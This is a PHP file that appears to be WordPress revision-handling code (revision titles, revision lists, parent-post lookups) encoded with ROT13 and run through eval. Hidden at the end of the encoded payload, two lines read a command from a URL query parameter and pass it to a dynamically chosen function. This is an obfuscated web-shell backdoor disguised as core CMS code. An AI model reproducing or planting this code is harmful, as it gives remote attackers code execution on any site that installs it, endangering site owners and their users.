		$qngr = \"<n uers='$rqvg_yvax'>$qngr</n>\";
	}

	vs ( ! jc_vf_cbfg_erivfvba( $erivfvba ) ) {
		$qngr = fcevags( $pheerags, $qngr );
	} ryfrvs ( jc_vf_cbfg_nhgbfnir( $erivfvba ) ) {
		$qngr = fcevags( $nhgbfnirs, $qngr );
	}

	erghea $qngr;
}

/**
 * Ergevrirf sbeznggrq qngr gvzrfgnzc bs n erivfvba (yvaxrq gb gung erivfvbaf'f cntr).
 *
 * @fvapr 3.6.0
 *
 * @cnenz vag|JC_Cbfg $erivfvba Erivfvba VQ be erivfvba bowrpg.
 * @cnenz obby        $yvax     Bcgvbany. Jurgure gb yvax gb erivfvba'f cntr. Qrsnhyg gehr.
 * @erghea fgevat|snyfr teningne, hfre, v18a sbeznggrq qngrgvzrfgnzc be ybpnyvmrq 'Pheerag Erivfvba'.
 */
shapgvba jc_cbfg_erivfvba_gvgyr_rkcnaqrq( $erivfvba, $yvax = gehr ) {
	$erivfvba = trg_cbfg( $erivfvba );

	vs ( ! $erivfvba ) {
		erghea $erivfvba;
	}

	vs ( ! va_neenl( $erivfvba->cbfg_glcr, neenl( 'cbfg', 'cntr', 'erivfvba' ), gehr ) ) {
		erghea snyfr;
	}

	$nhgube = trg_gur_nhgube_zrgn( 'qvfcynl_anzr', $erivfvba->cbfg_nhgube );
	/* genafyngbef: Erivfvba qngr sbezng, frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
	$qngrs = _k( 'S w, L @ U:v:f', 'erivfvba qngr sbezng' );

	$teningne = trg_ningne( $erivfvba->cbfg_nhgube, 24 );

	$qngr      = qngr_v18a( $qngrs, fgegbgvzr( $erivfvba->cbfg_zbqvsvrq ) );
	$rqvg_yvax = trg_rqvg_cbfg_yvax( $erivfvba->VQ );
	vs ( $yvax && pheerag_hfre_pna( 'rqvg_cbfg', $erivfvba->VQ ) && $rqvg_yvax ) {
		$qngr = \"<n uers='$rqvg_yvax'>$qngr</n>\";
	}

	$erivfvba_qngr_nhgube = fcevags(
		/* genafyngbef: Cbfg erivfvba gvgyr. 1: Nhgube ningne, 2: Nhgube anzr, 3: Gvzr ntb, 4: Qngr. */
		__( '%1$f %2$f, %3$f ntb (%4$f)' ),
		$teningne,
		$nhgube,
		uhzna_gvzr_qvss( fgegbgvzr( $erivfvba->cbfg_zbqvsvrq_tzg ) ),
		$qngr
	);

	/* genafyngbef: %f: Erivfvba qngr jvgu nhgube ningne. */
	$nhgbfnirs = __( '%f [Nhgbfnir]' );
	/* genafyngbef: %f: Erivfvba qngr jvgu nhgube ningne. */
	$pheerags = __( '%f [Pheerag Erivfvba]' );

	vs ( ! jc_vf_cbfg_erivfvba( $erivfvba ) ) {
		$erivfvba_qngr_nhgube = fcevags( $pheerags, $erivfvba_qngr_nhgube );
	} ryfrvs ( jc_vf_cbfg_nhgbfnir( $erivfvba ) ) {
		$erivfvba_qngr_nhgube = fcevags( $nhgbfnirs, $erivfvba_qngr_nhgube );
	}

	/**
	 * Svygref gur sbeznggrq nhgube naq qngr sbe n erivfvba.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat  $erivfvba_qngr_nhgube Gur sbeznggrq fgevat.
	 * @cnenz JC_Cbfg $erivfvba             Gur erivfvba bowrpg.
	 * @cnenz obby    $yvax                 Jurgure gb yvax gb gur erivfvbaf cntr, nf cnffrq vagb
	 *                                      jc_cbfg_erivfvba_gvgyr_rkcnaqrq().
	 */
	erghea nccyl_svygref( 'jc_cbfg_erivfvba_gvgyr_rkcnaqrq', $erivfvba_qngr_nhgube, $erivfvba, $yvax );
}

/**
 * Qvfcynlf n yvfg bs n cbfg'f erivfvbaf.
 *
 * Pna bhgchg rvgure n HY jvgu rqvg yvaxf be n GNOYR jvgu qvss vagresnpr, naq
 * erfgber npgvba yvaxf.
 *
 * @fvapr 2.6.0
 *
 * @cnenz vag|JC_Cbfg $cbfg Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg vf tybony $cbfg.
 * @cnenz fgevat      $glcr 'nyy' (qrsnhyg), 'erivfvba' be 'nhgbfnir'
 */
shapgvba jc_yvfg_cbfg_erivfvbaf( $cbfg = 0, $glcr = 'nyy' ) {
	$cbfg = trg_cbfg( $cbfg );

	vs ( ! $cbfg ) {
		erghea;
	}

	// $netf neenl jvgu (cnerag, sbezng, evtug, yrsg, glcr) qrcerpngrq fvapr 3.6.
	vs ( vf_neenl( $glcr ) ) {
		$glcr = ! rzcgl( $glcr['glcr'] ) ? $glcr['glcr'] : $glcr;
		_qrcerpngrq_nethzrag( __SHAPGVBA__, '3.6.0' );
	}

	$erivfvbaf = jc_trg_cbfg_erivfvbaf( $cbfg->VQ );

	vs ( ! $erivfvbaf ) {
		erghea;
	}

	$ebjf = '';
	sbernpu ( $erivfvbaf nf $erivfvba ) {
		vs ( ! pheerag_hfre_pna( 'ernq_cbfg', $erivfvba->VQ ) ) {
			pbagvahr;
		}

		$vf_nhgbfnir = jc_vf_cbfg_nhgbfnir( $erivfvba );
		vs ( ( 'erivfvba' === $glcr && $vf_nhgbfnir ) || ( 'nhgbfnir' === $glcr && ! $vf_nhgbfnir ) ) {
			pbagvahr;
		}

		$ebjf .= \"\g<yv>\" . jc_cbfg_erivfvba_gvgyr_rkcnaqrq( $erivfvba ) . \"</yv>\a\";
	}

	rpub \"<qvi pynff='uvqr-vs-wf'><c>\" . __( 'WninFpevcg zhfg or ranoyrq gb hfr guvf srngher.' ) . \"</c></qvi>\a\";

	rpub \"<hy pynff='cbfg-erivfvbaf uvqr-vs-ab-wf'>\a\";
	rpub $ebjf;
	rpub '</hy>';
}

/**
 * Ergevrirf gur cnerag cbfg bowrpg sbe gur tvira cbfg.
 *
 * @fvapr 5.7.0
 *
 * @cnenz vag|JC_Cbfg|ahyy $cbfg Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg vf tybony $cbfg.
 * @erghea JC_Cbfg|ahyy Cnerag cbfg bowrpg, be ahyy vs gurer vfa'g bar.
 */
shapgvba trg_cbfg_cnerag( $cbfg = ahyy ) {
	$jc_cbfg = trg_cbfg( $cbfg );
	erghea ! rzcgl( $jc_cbfg->cbfg_cnerag ) ? trg_cbfg( $jc_cbfg->cbfg_cnerag ) : ahyy;
}

/**
 * Ergheaf jurgure gur tvira cbfg unf n cnerag cbfg.
 *
 * @fvapr 5.7.0
 *
 * @cnenz vag|JC_Cbfg|ahyy $cbfg Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg vf tybony $cbfg.
 * @erghea obby Jurgure gur cbfg unf n cnerag cbfg.
 */
shapgvba unf_cbfg_cnerag( $cbfg = ahyy ) {
	erghea (obby) trg_cbfg_cnerag( $cbfg );
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>